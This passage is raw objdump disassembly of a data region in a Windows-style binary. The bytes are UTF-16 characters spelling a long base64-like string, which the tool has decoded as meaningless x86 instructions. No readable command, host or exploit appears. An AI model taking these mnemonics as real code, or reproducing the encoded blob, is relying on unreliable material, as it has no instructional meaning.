  40b37e:	00 35 00 32 00 38    	add    %dh,0x38003200
  40b384:	00 52 00             	add    %dl,0x0(%edx)
  40b387:	46                   	inc    %esi
  40b388:	00 53 00             	add    %dl,0x0(%ebx)
  40b38b:	4d                   	dec    %ebp
  40b38c:	00 73 00             	add    %dh,0x0(%ebx)
  40b38f:	47                   	inc    %edi
  40b390:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
  40b394:	00 4f 00             	add    %cl,0x0(%edi)
  40b397:	42                   	inc    %edx
  40b398:	00 4e 00             	add    %cl,0x0(%esi)
  40b39b:	45                   	inc    %ebp
  40b39c:	00 47 00             	add    %al,0x0(%edi)
  40b39f:	30 00                	xor    %al,(%eax)
  40b3a1:	4c                   	dec    %esp
  40b3a2:	00 4d 00             	add    %cl,0x0(%ebp)
  40b3a5:	39 00                	cmp    %eax,(%eax)
  40b3a7:	6b 00 46             	imul   $0x46,(%eax),%eax
  40b3aa:	00 72 00             	add    %dh,0x0(%edx)
  40b3ad:	77 00                	ja     0x40b3af
  40b3af:	2f                   	das
  40b3b0:	00 65 00             	add    %ah,0x0(%ebp)
  40b3b3:	71 00                	jno    0x40b3b5
  40b3b5:	39 00                	cmp    %eax,(%eax)
  40b3b7:	53                   	push   %ebx
  40b3b8:	00 59 00             	add    %bl,0x0(%ecx)
  40b3bb:	44                   	inc    %esp
  40b3bc:	00 36                	add    %dh,(%esi)
  40b3be:	00 38                	add    %bh,(%eax)
  40b3c0:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  40b3c4:	00 30                	add    %dh,(%eax)
  40b3c6:	00 2b                	add    %ch,(%ebx)
  40b3c8:	00 6e 00             	add    %ch,0x0(%esi)
  40b3cb:	47                   	inc    %edi
  40b3cc:	00 56 00             	add    %dl,0x0(%esi)
  40b3cf:	41                   	inc    %ecx
  40b3d0:	00 4f 00             	add    %cl,0x0(%edi)
  40b3d3:	49                   	dec    %ecx
  40b3d4:	00 2f                	add    %ch,(%edi)
  40b3d6:	00 6b 00             	add    %ch,0x0(%ebx)
  40b3d9:	42                   	inc    %edx
  40b3da:	00 73 00             	add    %dh,0x0(%ebx)
  40b3dd:	43                   	inc    %ebx
  40b3de:	00 44 00 4b          	add    %al,0x4b(%eax,%eax,1)
  40b3e2:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  40b3e6:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  40b3ea:	00 7a 00             	add    %bh,0x0(%edx)
  40b3ed:	6a 00                	push   $0x0
  40b3ef:	6b 00 36             	imul   $0x36,(%eax),%eax
  40b3f2:	00 75 00             	add    %dh,0x0(%ebp)
  40b3f5:	73 00                	jae    0x40b3f7
  40b3f7:	30 00                	xor    %al,(%eax)
  40b3f9:	33 00                	xor    (%eax),%eax
  40b3fb:	6b 00 49             	imul   $0x49,(%eax),%eax
  40b3fe:	00 54 00 77          	add    %dl,0x77(%eax,%eax,1)
  40b402:	00 71 00             	add    %dh,0x0(%ecx)
  40b405:	53                   	push   %ebx
  40b406:	00 50 00             	add    %dl,0x0(%eax)
  40b409:	58                   	pop    %eax
  40b40a:	00 65 00             	add    %ah,0x0(%ebp)
  40b40d:	67 00 34             	add    %dh,(%si)
  40b410:	00 67 00             	add    %ah,0x0(%edi)
  40b413:	49                   	dec    %ecx
  40b414:	00 70 00             	add    %dh,0x0(%eax)
  40b417:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
  40b41b:	71 00                	jno    0x40b41d
  40b41d:	4a                   	dec    %edx
  40b41e:	00 37                	add    %dh,(%edi)
  40b420:	00 6b 00             	add    %ch,0x0(%ebx)
  40b423:	6a 00                	push   $0x0
  40b425:	51                   	push   %ecx
  40b426:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  40b42a:	00 78 00             	add    %bh,0x0(%eax)
  40b42d:	48                   	dec    %eax
  40b42e:	00 32                	add    %dh,(%edx)
  40b430:	00 46 00             	add    %al,0x0(%esi)
  40b433:	44                   	inc    %esp
  40b434:	00 6e 00             	add    %ch,0x0(%esi)
  40b437:	38 00                	cmp    %al,(%eax)
  40b439:	6c                   	insb   (%dx),%es:(%edi)
  40b43a:	00 55 00             	add    %dl,0x0(%ebp)
  40b43d:	2f                   	das
  40b43e:	00 67 00             	add    %ah,0x0(%edi)
  40b441:	5a                   	pop    %edx
  40b442:	00 77 00             	add    %dh,0x0(%edi)
  40b445:	73 00                	jae    0x40b447
  40b447:	52                   	push   %edx
  40b448:	00 69 00             	add    %ch,0x0(%ecx)
  40b44b:	53                   	push   %ebx
  40b44c:	00 63 00             	add    %ah,0x0(%ebx)
  40b44f:	79 00                	jns    0x40b451
  40b451:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40b455:	74 00                	je     0x40b457
  40b457:	59                   	pop    %ecx
  40b458:	00 57 00             	add    %dl,0x0(%edi)
  40b45b:	51                   	push   %ecx
  40b45c:	00 30                	add    %dh,(%eax)
  40b45e:	00 6d 00             	add    %ch,0x0(%ebp)
  40b461:	6b 00 55             	imul   $0x55,(%eax),%eax
  40b464:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40b468:	00 67 00             	add    %ah,0x0(%edi)
  40b46b:	4b                   	dec    %ebx
  40b46c:	00 77 00             	add    %dh,0x0(%edi)
  40b46f:	52                   	push   %edx
  40b470:	00 50 00             	add    %dl,0x0(%eax)
  40b473:	66 00 39             	data16 add %bh,(%ecx)
  40b476:	00 32                	add    %dh,(%edx)
  40b478:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40b47c:	00 56 00             	add    %dl,0x0(%esi)
  40b47f:	4e                   	dec    %esi
  40b480:	00 76 00             	add    %dh,0x0(%esi)
  40b483:	37                   	aaa
  40b484:	00 6a 00             	add    %ch,0x0(%edx)
  40b487:	5a                   	pop    %edx
  40b488:	00 39                	add    %bh,(%ecx)
  40b48a:	00 75 00             	add    %dh,0x0(%ebp)
  40b48d:	2f                   	das
  40b48e:	00 57 00             	add    %dl,0x0(%edi)
  40b491:	41                   	inc    %ecx
  40b492:	00 73 00             	add    %dh,0x0(%ebx)
  40b495:	43                   	inc    %ebx
  40b496:	00 48 00             	add    %cl,0x0(%eax)
  40b499:	48                   	dec    %eax
  40b49a:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
  40b49e:	00 2b                	add    %ch,(%ebx)
  40b4a0:	00 72 00             	add    %dh,0x0(%edx)
  40b4a3:	48                   	dec    %eax
  40b4a4:	00 65 00             	add    %ah,0x0(%ebp)
  40b4a7:	46                   	inc    %esi
  40b4a8:	00 30                	add    %dh,(%eax)
  40b4aa:	00 48 00             	add    %cl,0x0(%eax)
  40b4ad:	47                   	inc    %edi
  40b4ae:	00 43 00             	add    %al,0x0(%ebx)
  40b4b1:	33 00                	xor    (%eax),%eax
  40b4b3:	62 00                	bound  %eax,(%eax)
  40b4b5:	4f                   	dec    %edi
  40b4b6:	00 53 00             	add    %dl,0x0(%ebx)
  40b4b9:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4ba:	00 31                	add    %dh,(%ecx)
  40b4bc:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4bf:	52                   	push   %edx
  40b4c0:	00 39                	add    %bh,(%ecx)
  40b4c2:	00 36                	add    %dh,(%esi)
  40b4c4:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4c7:	4e                   	dec    %esi
  40b4c8:	00 6c 00 35          	add    %ch,0x35(%eax,%eax,1)
  40b4cc:	00 5a 00             	add    %bl,0x0(%edx)
  40b4cf:	39 00                	cmp    %eax,(%eax)
  40b4d1:	65 00 4c 00 2b       	add    %cl,%gs:0x2b(%eax,%eax,1)
  40b4d6:	00 4d 00             	add    %cl,0x0(%ebp)
  40b4d9:	53                   	push   %ebx
  40b4da:	00 37                	add    %dh,(%edi)
  40b4dc:	00 78 00             	add    %bh,0x0(%eax)
  40b4df:	52                   	push   %edx
  40b4e0:	00 43 00             	add    %al,0x0(%ebx)
  40b4e3:	46                   	inc    %esi
  40b4e4:	00 6e 00             	add    %ch,0x0(%esi)
  40b4e7:	2b 00                	sub    (%eax),%eax
  40b4e9:	38 00                	cmp    %al,(%eax)
  40b4eb:	32 00                	xor    (%eax),%al
  40b4ed:	2b 00                	sub    (%eax),%eax
  40b4ef:	78 00                	js     0x40b4f1
  40b4f1:	46                   	inc    %esi
  40b4f2:	00 2b                	add    %ch,(%ebx)
  40b4f4:	00 36                	add    %dh,(%esi)
  40b4f6:	00 72 00             	add    %dh,0x0(%edx)
  40b4f9:	44                   	inc    %esp
  40b4fa:	00 4d 00             	add    %cl,0x0(%ebp)
  40b4fd:	30 00                	xor    %al,(%eax)
  40b4ff:	58                   	pop    %eax
  40b500:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  40b504:	00 62 00             	add    %ah,0x0(%edx)
  40b507:	64 00 74 00 70       	add    %dh,%fs:0x70(%eax,%eax,1)
  40b50c:	00 6d 00             	add    %ch,0x0(%ebp)
  40b50f:	38 00                	cmp    %al,(%eax)
  40b511:	33 00                	xor    (%eax),%eax
  40b513:	62 00                	bound  %eax,(%eax)
  40b515:	71 00                	jno    0x40b517
  40b517:	51                   	push   %ecx
  40b518:	00 70 00             	add    %dh,0x0(%eax)
  40b51b:	76 00                	jbe    0x40b51d
  40b51d:	37                   	aaa
  40b51e:	00 72 00             	add    %dh,0x0(%edx)
  40b521:	52                   	push   %edx
  40b522:	00 76 00             	add    %dh,0x0(%esi)
  40b525:	46                   	inc    %esi
  40b526:	00 4b 00             	add    %cl,0x0(%ebx)
  40b529:	4f                   	dec    %edi
  40b52a:	00 4a 00             	add    %cl,0x0(%edx)
  40b52d:	41                   	inc    %ecx
  40b52e:	00 50 00             	add    %dl,0x0(%eax)
  40b531:	2f                   	das
  40b532:	00 6b 00             	add    %ch,0x0(%ebx)
  40b535:	6b 00 79             	imul   $0x79,(%eax),%eax
  40b538:	00 37                	add    %dh,(%edi)
  40b53a:	00 44 00 6b          	add    %al,0x6b(%eax,%eax,1)
  40b53e:	00 58 00             	add    %bl,0x0(%eax)
  40b541:	75 00                	jne    0x40b543
  40b543:	51                   	push   %ecx
  40b544:	00 31                	add    %dh,(%ecx)
  40b546:	00 59 00             	add    %bl,0x0(%ecx)
  40b549:	6f                   	outsl  %ds:(%esi),(%dx)
  40b54a:	00 2f                	add    %ch,(%edi)
  40b54c:	00 4e 00             	add    %cl,0x0(%esi)
  40b54f:	6c                   	insb   (%dx),%es:(%edi)
  40b550:	00 58 00             	add    %bl,0x0(%eax)
  40b553:	72 00                	jb     0x40b555
  40b555:	4f                   	dec    %edi
  40b556:	00 37                	add    %dh,(%edi)
  40b558:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40b55c:	00 32                	add    %dh,(%edx)
  40b55e:	00 4b 00             	add    %cl,0x0(%ebx)
  40b561:	30 00                	xor    %al,(%eax)
  40b563:	61                   	popa
  40b564:	00 31                	add    %dh,(%ecx)
  40b566:	00 42 00             	add    %al,0x0(%edx)
  40b569:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  40b56d:	4f                   	dec    %edi
  40b56e:	00 6b 00             	add    %ch,0x0(%ebx)
  40b571:	4e                   	dec    %esi
  40b572:	00 72 00             	add    %dh,0x0(%edx)
  40b575:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40b579:	46                   	inc    %esi
  40b57a:	00 62 00             	add    %ah,0x0(%edx)
  40b57d:	4e                   	dec    %esi
  40b57e:	00 73 00             	add    %dh,0x0(%ebx)
  40b581:	67 00 4d 00          	add    %cl,0x0(%di)
  40b585:	2b 00                	sub    (%eax),%eax
  40b587:	5a                   	pop    %edx
  40b588:	00 36                	add    %dh,(%esi)
  40b58a:	00 4b 00             	add    %cl,0x0(%ebx)
  40b58d:	46                   	inc    %esi
  40b58e:	00 63 00             	add    %ah,0x0(%ebx)
  40b591:	73 00                	jae    0x40b593
  40b593:	48                   	dec    %eax
  40b594:	00 52 00             	add    %dl,0x0(%edx)
  40b597:	75 00                	jne    0x40b599
  40b599:	33 00                	xor    (%eax),%eax
  40b59b:	65 00 54 00 58       	add    %dl,%gs:0x58(%eax,%eax,1)
  40b5a0:	00 4b 00             	add    %cl,0x0(%ebx)
  40b5a3:	57                   	push   %edi
  40b5a4:	00 73 00             	add    %dh,0x0(%ebx)
  40b5a7:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  40b5ab:	63 00                	arpl   %eax,(%eax)
  40b5ad:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5ae:	00 4c 00 37          	add    %cl,0x37(%eax,%eax,1)
  40b5b2:	00 7a 00             	add    %bh,0x0(%edx)
  40b5b5:	79 00                	jns    0x40b5b7
  40b5b7:	49                   	dec    %ecx
  40b5b8:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
  40b5bc:	00 52 00             	add    %dl,0x0(%edx)
  40b5bf:	4a                   	dec    %edx
  40b5c0:	00 67 00             	add    %ah,0x0(%edi)
  40b5c3:	79 00                	jns    0x40b5c5
  40b5c5:	68 00 58 00 6e       	push   $0x6e005800
  40b5ca:	00 4c 00 34          	add    %cl,0x34(%eax,%eax,1)
  40b5ce:	00 70 00             	add    %dh,0x0(%eax)
  40b5d1:	58                   	pop    %eax
  40b5d2:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40b5d6:	00 58 00             	add    %bl,0x0(%eax)
  40b5d9:	62 00                	bound  %eax,(%eax)
  40b5db:	74 00                	je     0x40b5dd
  40b5dd:	50                   	push   %eax
  40b5de:	00 75 00             	add    %dh,0x0(%ebp)
  40b5e1:	30 00                	xor    %al,(%eax)
  40b5e3:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5e4:	00 61 00             	add    %ah,0x0(%ecx)
  40b5e7:	58                   	pop    %eax
  40b5e8:	00 38                	add    %bh,(%eax)
  40b5ea:	00 42 00             	add    %al,0x0(%edx)
  40b5ed:	41                   	inc    %ecx
  40b5ee:	00 73 00             	add    %dh,0x0(%ebx)
  40b5f1:	37                   	aaa
  40b5f2:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
  40b5f6:	00 43 00             	add    %al,0x0(%ebx)
  40b5f9:	4e                   	dec    %esi
  40b5fa:	00 62 00             	add    %ah,0x0(%edx)
  40b5fd:	55                   	push   %ebp
  40b5fe:	00 65 00             	add    %ah,0x0(%ebp)
  40b601:	36 00 6b 00          	add    %ch,%ss:0x0(%ebx)
  40b605:	65 00 74 00 61       	add    %dh,%gs:0x61(%eax,%eax,1)
  40b60a:	00 58 00             	add    %bl,0x0(%eax)
  40b60d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b60e:	00 76 00             	add    %dh,0x0(%esi)
  40b611:	62 00                	bound  %eax,(%eax)
  40b613:	31 00                	xor    %eax,(%eax)
  40b615:	61                   	popa
  40b616:	00 71 00             	add    %dh,0x0(%ecx)
  40b619:	67 00 38             	add    %bh,(%bx,%si)
  40b61c:	00 76 00             	add    %dh,0x0(%esi)
  40b61f:	46                   	inc    %esi
  40b620:	00 37                	add    %dh,(%edi)
  40b622:	00 69 00             	add    %ch,0x0(%ecx)
  40b625:	74 00                	je     0x40b627
  40b627:	47                   	inc    %edi
  40b628:	00 37                	add    %dh,(%edi)
  40b62a:	00 77 00             	add    %dh,0x0(%edi)
  40b62d:	31 00                	xor    %eax,(%eax)
  40b62f:	71 00                	jno    0x40b631
  40b631:	76 00                	jbe    0x40b633
  40b633:	53                   	push   %ebx
  40b634:	00 67 00             	add    %ah,0x0(%edi)
  40b637:	56                   	push   %esi
  40b638:	00 70 00             	add    %dh,0x0(%eax)
  40b63b:	30 00                	xor    %al,(%eax)
  40b63d:	78 00                	js     0x40b63f
  40b63f:	7a 00                	jp     0x40b641
  40b641:	71 00                	jno    0x40b643
  40b643:	57                   	push   %edi
  40b644:	00 4a 00             	add    %cl,0x0(%edx)
  40b647:	5a                   	pop    %edx
  40b648:	00 58 00             	add    %bl,0x0(%eax)
  40b64b:	75 00                	jne    0x40b64d
  40b64d:	33 00                	xor    (%eax),%eax
  40b64f:	6d                   	insl   (%dx),%es:(%edi)
  40b650:	00 46 00             	add    %al,0x0(%esi)
  40b653:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  40b657:	32 00                	xor    (%eax),%al
  40b659:	56                   	push   %esi
  40b65a:	00 32                	add    %dh,(%edx)
  40b65c:	00 65 00             	add    %ah,0x0(%ebp)
  40b65f:	56                   	push   %esi
  40b660:	00 6b 00             	add    %ch,0x0(%ebx)
  40b663:	70 00                	jo     0x40b665
  40b665:	47                   	inc    %edi
  40b666:	00 78 00             	add    %bh,0x0(%eax)
  40b669:	64 00 32             	add    %dh,%fs:(%edx)
  40b66c:	00 45 00             	add    %al,0x0(%ebp)
  40b66f:	31 00                	xor    %eax,(%eax)
  40b671:	6d                   	insl   (%dx),%es:(%edi)
  40b672:	00 79 00             	add    %bh,0x0(%ecx)
  40b675:	76 00                	jbe    0x40b677
  40b677:	6e                   	outsb  %ds:(%esi),(%dx)
  40b678:	00 37                	add    %dh,(%edi)
  40b67a:	00 6d 00             	add    %ch,0x0(%ebp)
  40b67d:	45                   	inc    %ebp
  40b67e:	00 70 00             	add    %dh,0x0(%eax)
  40b681:	51                   	push   %ecx
  40b682:	00 46 00             	add    %al,0x0(%esi)
  40b685:	78 00                	js     0x40b687
  40b687:	76 00                	jbe    0x40b689
  40b689:	4c                   	dec    %esp
  40b68a:	00 6f 00             	add    %ch,0x0(%edi)
  40b68d:	64 00 33             	add    %dh,%fs:(%ebx)
  40b690:	00 55 00             	add    %dl,0x0(%ebp)
  40b693:	45                   	inc    %ebp
  40b694:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  40b698:	00 4e 00             	add    %cl,0x0(%esi)
  40b69b:	52                   	push   %edx
  40b69c:	00 53 00             	add    %dl,0x0(%ebx)
  40b69f:	6b 00 2b             	imul   $0x2b,(%eax),%eax
  40b6a2:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b6a5:	6c                   	insb   (%dx),%es:(%edi)
  40b6a6:	00 4b 00             	add    %cl,0x0(%ebx)
  40b6a9:	48                   	dec    %eax
  40b6aa:	00 46 00             	add    %al,0x0(%esi)
  40b6ad:	34 00                	xor    $0x0,%al
  40b6af:	48                   	dec    %eax
  40b6b0:	00 74 00 46          	add    %dh,0x46(%eax,%eax,1)
  40b6b4:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
  40b6b8:	00 49 00             	add    %cl,0x0(%ecx)
  40b6bb:	38 00                	cmp    %al,(%eax)
  40b6bd:	58                   	pop    %eax
  40b6be:	00 45 00             	add    %al,0x0(%ebp)
  40b6c1:	62 00                	bound  %eax,(%eax)
  40b6c3:	48                   	dec    %eax
  40b6c4:	00 48 00             	add    %cl,0x0(%eax)
  40b6c7:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  40b6cb:	76 00                	jbe    0x40b6cd
  40b6cd:	4f                   	dec    %edi
  40b6ce:	00 55 00             	add    %dl,0x0(%ebp)
  40b6d1:	70 00                	jo     0x40b6d3
  40b6d3:	69 00 34 00 69 00    	imul   $0x690034,(%eax),%eax
  40b6d9:	33 00                	xor    (%eax),%eax
  40b6db:	4d                   	dec    %ebp
  40b6dc:	00 52 00             	add    %dl,0x0(%edx)
  40b6df:	59                   	pop    %ecx
  40b6e0:	00 46 00             	add    %al,0x0(%esi)
  40b6e3:	4d                   	dec    %ebp
  40b6e4:	00 77 00             	add    %dh,0x0(%edi)
  40b6e7:	78 00                	js     0x40b6e9
  40b6e9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6ea:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40b6ee:	00 7a 00             	add    %bh,0x0(%edx)
  40b6f1:	71 00                	jno    0x40b6f3
  40b6f3:	39 00                	cmp    %eax,(%eax)
  40b6f5:	71 00                	jno    0x40b6f7
  40b6f7:	74 00                	je     0x40b6f9
  40b6f9:	76 00                	jbe    0x40b6fb
  40b6fb:	77 00                	ja     0x40b6fd
  40b6fd:	7a 00                	jp     0x40b6ff
  40b6ff:	4a                   	dec    %edx
  40b700:	00 47 00             	add    %al,0x0(%edi)
  40b703:	4b                   	dec    %ebx
  40b704:	00 6a 00             	add    %ch,0x0(%edx)
  40b707:	51                   	push   %ecx
  40b708:	00 46 00             	add    %al,0x0(%esi)
  40b70b:	30 00                	xor    %al,(%eax)
  40b70d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b70e:	00 49 00             	add    %cl,0x0(%ecx)
  40b711:	56                   	push   %esi
  40b712:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  40b716:	00 2b                	add    %ch,(%ebx)
  40b718:	00 6a 00             	add    %ch,0x0(%edx)
  40b71b:	49                   	dec    %ecx
  40b71c:	00 53 00             	add    %dl,0x0(%ebx)
  40b71f:	68 00 4e 00 44       	push   $0x44004e00
  40b724:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
  40b728:	00 73 00             	add    %dh,0x0(%ebx)
  40b72b:	30 00                	xor    %al,(%eax)
  40b72d:	74 00                	je     0x40b72f
  40b72f:	71 00                	jno    0x40b731
  40b731:	48                   	dec    %eax
  40b732:	00 46 00             	add    %al,0x0(%esi)
  40b735:	70 00                	jo     0x40b737
  40b737:	67 00 67 00          	add    %ah,0x0(%bx)
  40b73b:	48                   	dec    %eax
  40b73c:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
  40b740:	00 31                	add    %dh,(%ecx)
  40b742:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
  40b746:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  40b74a:	00 32                	add    %dh,(%edx)
  40b74c:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  40b750:	00 50 00             	add    %dl,0x0(%eax)
  40b753:	30 00                	xor    %al,(%eax)
  40b755:	4c                   	dec    %esp
  40b756:	00 47 00             	add    %al,0x0(%edi)
  40b759:	4c                   	dec    %esp
  40b75a:	00 79 00             	add    %bh,0x0(%ecx)
  40b75d:	79 00                	jns    0x40b75f
  40b75f:	31 00                	xor    %eax,(%eax)
  40b761:	73 00                	jae    0x40b763
  40b763:	71 00                	jno    0x40b765
  40b765:	47                   	inc    %edi
  40b766:	00 39                	add    %bh,(%ecx)
  40b768:	00 6e 00             	add    %ch,0x0(%esi)
  40b76b:	4c                   	dec    %esp
  40b76c:	00 62 00             	add    %ah,0x0(%edx)
  40b76f:	5a                   	pop    %edx
  40b770:	00 58 00             	add    %bl,0x0(%eax)
  40b773:	74 00                	je     0x40b775
  40b775:	32 00                	xor    (%eax),%al
  40b777:	45                   	inc    %ebp
  40b778:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  40b77c:	00 4d 00             	add    %cl,0x0(%ebp)
  40b77f:	56                   	push   %esi
  40b780:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  40b784:	00 78 00             	add    %bh,0x0(%eax)
  40b787:	51                   	push   %ecx
  40b788:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  40b78c:	00 61 00             	add    %ah,0x0(%ecx)
  40b78f:	35 00 55 00 6a       	xor    $0x6a005500,%eax
  40b794:	00 66 00             	add    %ah,0x0(%esi)
  40b797:	6c                   	insb   (%dx),%es:(%edi)
  40b798:	00 2b                	add    %ch,(%ebx)
  40b79a:	00 4e 00             	add    %cl,0x0(%esi)
  40b79d:	78 00                	js     0x40b79f
  40b79f:	65 00 46 00          	add    %al,%gs:0x0(%esi)
  40b7a3:	48                   	dec    %eax
  40b7a4:	00 72 00             	add    %dh,0x0(%edx)
  40b7a7:	30 00                	xor    %al,(%eax)
  40b7a9:	72 00                	jb     0x40b7ab
  40b7ab:	4d                   	dec    %ebp
  40b7ac:	00 51 00             	add    %dl,0x0(%ecx)
  40b7af:	6d                   	insl   (%dx),%es:(%edi)
  40b7b0:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  40b7b4:	00 2b                	add    %ch,(%ebx)
  40b7b6:	00 41 00             	add    %al,0x0(%ecx)
  40b7b9:	32 00                	xor    (%eax),%al
  40b7bb:	52                   	push   %edx
  40b7bc:	00 47 00             	add    %al,0x0(%edi)
  40b7bf:	4d                   	dec    %ebp
  40b7c0:	00 4a 00             	add    %cl,0x0(%edx)
  40b7c3:	4a                   	dec    %edx
  40b7c4:	00 5a 00             	add    %bl,0x0(%edx)
  40b7c7:	49                   	dec    %ecx
  40b7c8:	00 63 00             	add    %ah,0x0(%ebx)
  40b7cb:	75 00                	jne    0x40b7cd
  40b7cd:	39 00                	cmp    %eax,(%eax)
  40b7cf:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40b7d3:	58                   	pop    %eax
  40b7d4:	00 4a 00             	add    %cl,0x0(%edx)
  40b7d7:	63 00                	arpl   %eax,(%eax)
  40b7d9:	51                   	push   %ecx
  40b7da:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b7dd:	4d                   	dec    %ebp
  40b7de:	00 2f                	add    %ch,(%edi)
  40b7e0:	00 35 00 7a 00 48    	add    %dh,0x48007a00
  40b7e6:	00 6f 00             	add    %ch,0x0(%edi)
  40b7e9:	53                   	push   %ebx
  40b7ea:	00 48 00             	add    %cl,0x0(%eax)
  40b7ed:	4e                   	dec    %esi
  40b7ee:	00 51 00             	add    %dl,0x0(%ecx)
  40b7f1:	63 00                	arpl   %eax,(%eax)
  40b7f3:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7f4:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b7f7:	34 00                	xor    $0x0,%al
  40b7f9:	56                   	push   %esi
  40b7fa:	00 51 00             	add    %dl,0x0(%ecx)
  40b7fd:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7fe:	00 72 00             	add    %dh,0x0(%edx)
  40b801:	71 00                	jno    0x40b803
  40b803:	68 00 4f 00 4e       	push   $0x4e004f00
  40b808:	00 69 00             	add    %ch,0x0(%ecx)
  40b80b:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40b80f:	51                   	push   %ecx
  40b810:	00 4d 00             	add    %cl,0x0(%ebp)
  40b813:	59                   	pop    %ecx
  40b814:	00 69 00             	add    %ch,0x0(%ecx)
  40b817:	38 00                	cmp    %al,(%eax)
  40b819:	4b                   	dec    %ebx
  40b81a:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  40b81e:	00 47 00             	add    %al,0x0(%edi)
  40b821:	33 00                	xor    (%eax),%eax
  40b823:	5a                   	pop    %edx
  40b824:	00 33                	add    %dh,(%ebx)
  40b826:	00 4f 00             	add    %cl,0x0(%edi)
  40b829:	74 00                	je     0x40b82b
  40b82b:	34 00                	xor    $0x0,%al
  40b82d:	6b 00 76             	imul   $0x76,(%eax),%eax
  40b830:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b833:	4f                   	dec    %edi
  40b834:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
  40b838:	00 6a 00             	add    %ch,0x0(%edx)
  40b83b:	70 00                	jo     0x40b83d
  40b83d:	43                   	inc    %ebx
  40b83e:	00 42 00             	add    %al,0x0(%edx)
  40b841:	39 00                	cmp    %eax,(%eax)
  40b843:	72 00                	jb     0x40b845
  40b845:	41                   	inc    %ecx
  40b846:	00 35 00 47 00 61    	add    %dh,0x61004700
  40b84c:	00 33                	add    %dh,(%ebx)
  40b84e:	00 2f                	add    %ch,(%edi)
  40b850:	00 51 00             	add    %dl,0x0(%ecx)
  40b853:	38 00                	cmp    %al,(%eax)
  40b855:	2b 00                	sub    (%eax),%eax
  40b857:	68 00 2b 00 49       	push   $0x49002b00
  40b85c:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  40b860:	00 36                	add    %dh,(%esi)
  40b862:	00 2b                	add    %ch,(%ebx)
  40b864:	00 4b 00             	add    %cl,0x0(%ebx)
  40b867:	61                   	popa
  40b868:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  40b86c:	00 52 00             	add    %dl,0x0(%edx)
  40b86f:	65 00 31             	add    %dh,%gs:(%ecx)
  40b872:	00 52 00             	add    %dl,0x0(%edx)
  40b875:	53                   	push   %ebx
  40b876:	00 51 00             	add    %dl,0x0(%ecx)
  40b879:	56                   	push   %esi
  40b87a:	00 30                	add    %dh,(%eax)
  40b87c:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  40b880:	00 47 00             	add    %al,0x0(%edi)
  40b883:	73 00                	jae    0x40b885
  40b885:	47                   	inc    %edi
  40b886:	00 56 00             	add    %dl,0x0(%esi)
  40b889:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40b88d:	71 00                	jno    0x40b88f
  40b88f:	67 00 66 00          	add    %ah,0x0(%bp)
  40b893:	32 00                	xor    (%eax),%al
  40b895:	6d                   	insl   (%dx),%es:(%edi)
  40b896:	00 4e 00             	add    %cl,0x0(%esi)
  40b899:	37                   	aaa
  40b89a:	00 75 00             	add    %dh,0x0(%ebp)
  40b89d:	65 00 31             	add    %dh,%gs:(%ecx)
  40b8a0:	00 2f                	add    %ch,(%edi)
  40b8a2:	00 41 00             	add    %al,0x0(%ecx)
  40b8a5:	36 00 37             	add    %dh,%ss:(%edi)
  40b8a8:	00 2b                	add    %ch,(%ebx)
  40b8aa:	00 56 00             	add    %dl,0x0(%esi)
  40b8ad:	64 00 42 00          	add    %al,%fs:0x0(%edx)
  40b8b1:	70 00                	jo     0x40b8b3
  40b8b3:	30 00                	xor    %al,(%eax)
  40b8b5:	6d                   	insl   (%dx),%es:(%edi)
  40b8b6:	00 4d 00             	add    %cl,0x0(%ebp)
  40b8b9:	33 00                	xor    (%eax),%eax
  40b8bb:	70 00                	jo     0x40b8bd
